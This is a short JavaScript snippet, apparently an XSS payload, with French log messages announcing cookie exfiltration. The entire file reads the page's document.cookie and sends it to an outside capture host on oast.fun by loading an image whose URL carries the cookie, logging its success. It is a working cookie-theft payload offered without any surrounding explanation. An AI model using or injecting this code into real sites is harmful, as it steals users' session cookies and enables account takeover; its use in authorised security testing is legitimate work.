(function () {
    console.log('[INFO] Exfiltration de cookie en cours...');
    try {
        const cookie = document.cookie;
        if (!cookie) return console.warn('[INFO] Aucun cookie trouvé');

        const img = new Image();
        img.src = 'https://kwzvnipoylejwhfgszax4idsmvlc0jrjt.oast.fun/?cookie=' + encodeURIComponent(cookie);
        console.log('[INFO] Cookie envoyé :', cookie);
    } catch (e) {
        console.error('[ERREUR] Problème lors de l\'exfiltration de cookie:', e);
    }
})();
